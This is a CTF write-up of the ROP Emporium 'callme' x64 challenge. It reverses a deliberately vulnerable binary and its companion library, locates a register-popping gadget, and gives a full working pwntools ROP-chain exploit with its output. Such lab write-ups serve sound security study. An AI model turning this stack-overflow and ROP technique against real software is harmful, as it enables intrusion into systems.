---
title: "Callme (x64)"
date: "2025-08-07"
tags: ["RopEmporium", "ROP"]
---

In this challenge they give us several things:

* The binary
* A `.dat` with the flag
* 2 keys.dat used to decrypt the flag
* A custom libc

First of all, let's look at the protections it has enabled:

```c
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

It only has NX, so I cannot inject shellcode. Let's reverse the code with `guidra` to see what is going on behind the scenes:

```c
void pwnme(void) {
    char local_28[32];

    memset(local_28, 0, 0x20);
    puts("Hope you read the instructions...\n");
    printf("> ");
    read(0, local_28, 0x200);
    puts("Thank you!");
    return;
}
```

There is a main function that prints a bit of text and then calls `pwnme()`. As we can see, this function is vulnerable because it lets us do a buffer overflow, since it allows writing 512 bytes into a 32 byte array.

Since this stack frame only holds that 32 byte array, the distance to the return address should be this:

```c
32 bytes del array + 8 bytes del rbp = 40 bytes
```

Now that we know the offset to the return address is 40 bytes we have control of the program flow, but where do we want to jump? There is no win function in the binary, so we could try a ret2libc to system for example. But there is a catch, the libc they give us has no system:

```c
readelf -a ./libcallme.so | grep "system"

```

If we look at the program functions we can see this one:

```c
void usefulFunction(void)
{
    callme_three(4, 5, 6);
    callme_two(4, 5, 6);
    callme_one(4, 5, 6);

    exit(1);  // WARNING: Subroutine does not return
}
```

From `guidra` we cannot see any information about those 3 functions being called. To find out what happens inside them I had to do something I had never done before in my life, which is reversing the libc. Those 3 functions are not in the binary, they live inside the libc they give us, so I have to open it with `guidra` to see what they contain. Let's see:

```c
void callme_one(long param_1, long param_2, long param_3)
{
    FILE *_stream;

    if ((param_1 != -0x2152411021524111) || 
        (param_2 != -0x3501454135014542) || 
        (param_3 != -0x2ff20ff22ff20ff3)) {
        puts("Incorrect parameters");
        exit(1);
    }

    _stream = fopen("encrypted_flag.dat", "r");
    if (_stream == (FILE *)0x0) {
        puts("Failed to open encrypted_flag.dat");
        exit(1);
    }

    char *g_buf = (char *)malloc(0x21);
    if (g_buf == (char *)0x0) {
        puts("Could not allocate memory");
        exit(1);
    }

    g_buf = fgets(g_buf, 0x21, _stream);
    fclose(_stream);

    puts("callme_one() called correctly");
    return;
}

```

The first function checks that each of the 3 arguments passed to it matches the ones in there, opens the file holding the flag and puts its content on the heap.

```c
void callme_two(long param_1, long param_2, long param_3)
{
    int iVar1;
    FILE *_stream;
    int i;

    if ((param_1 == -0x2152411021524111) &&
        (param_2 == -0x3501454135014542) &&
        (param_3 == -0x2ff20ff22ff20ff3)) {
        
        _stream = fopen("key1.dat", "r");
        if (_stream == (FILE *)0x0) {
            puts("Failed to open key1.dat");
            exit(1);
        }

        for (i = 0; i < 0x10; i++) {
            iVar1 = fgetc(_stream);
            *((byte *)g_buf + i) = *((byte *)g_buf + i) ^ (byte)iVar1;
        }

        puts("callme_two() called correctly");
        return;
    }

    puts("Incorrect parameters");
    exit(1);
}

```

This one asks for the 3 arguments again and, if they match, runs an operation that partially decrypts the file content sitting on the heap.

```c
void callme_three(long param_1, long param_2, long param_3)
{
    int iVar1;
    FILE *_stream;
    int local_l4;

    if ((param_1 == -0x2152411021524111) &&
        (param_2 == -0x3501454135014542) &&
        (param_3 == -0x2ff20ff22ff20ff3))
    {
        _stream = fopen("key2.dat", "r");
        if (_stream == NULL) {
            puts("Failed to open key2.dat");
            exit(1);
        }

        for (local_l4 = 0x10; local_l4 < 0x20; local_l4++) {
            iVar1 = fgetc(_stream);
            g_buf[local_l4] = g_buf[local_l4] ^ (byte)iVar1;
        }

        if (*(ulong *)(g_buf + 4) == 0xdeadbeefdeadbeefUL &&
            *(ulong *)(g_buf + 0xc) == 0xcafebabecafebabeUL &&
            *(ulong *)(g_buf + 0x14) == 0xd00df00dd00df00dUL)
        {
            puts(g_buf);
            exit(0);
        }

        puts("Incorrect parameters");
        exit(1);
    }

    puts("Incorrect parameters");
    exit(1);
}

```

The last function opens `key2.dat` and does the final decryption stage on the heap content, asking for the 3 arguments once more before that.

So I have to make the program flow do the following:

```c
callme_one() --> callme_two() --> callme_three()
```

But every function needs its own arguments, which are the same in all of them:

* `0xdeadbeefdeadbeef`
* `0xcafebabecafebabe`
* `d00df00dd00df00d`

To do this, since we are on 64 bits, I first have to set the right registers. Debugging shows they ask for these:

```c++
004008f6    mov edx, 0x6
004008fb    mov esi, 0x5
00400900    mov edi, 0x4
00400905    call <EXTERNAL>::callme_three

0040090a    mov edx, 0x6
0040090f    mov esi, 0x5
00400914    mov edi, 0x4
00400919    call <EXTERNAL>::callme_two

0040091e    mov edx, 0x6
00400923    mov esi, 0x5
00400928    mov edi, 0x4
0040092d    call <EXTERNAL>::callme_one

```

As we can see the first argument goes in RDI, the second in RSI and the third in RDX.

Now I have to find one or more gadgets that let me put those values into the registers. Luckily the program has this function:

```c
000000000040093c <usefulGadgets>:
  40093c:	5f                   	pop    rdi
  40093d:	5e                   	pop    rsi
  40093e:	5a                   	pop    rdx
  40093f:	c3                   	ret
```

This function gives me every gadget I need in one. For some reason it does not show up in `guidra` and I had to use `objdump`. We can also confirm the gadget exists with `RopGadget`:

```c
ROPgadget --binary callme | grep "rdi"
. . .
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
. . .
```

Now that we know all this we can write the final script:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./callme")
libc = ELF("./libcallme.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b usefulFunction
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    
    offset = 40
    pop_rdi_rsi_rdx = 0x0040093c
    
    payload = flat({
        offset: [
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_one,
            
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_two,
            
            pop_rdi_rsi_rdx,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            
            exe.plt.callme_three
        ]
    })

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

It works. Thanks for reading!
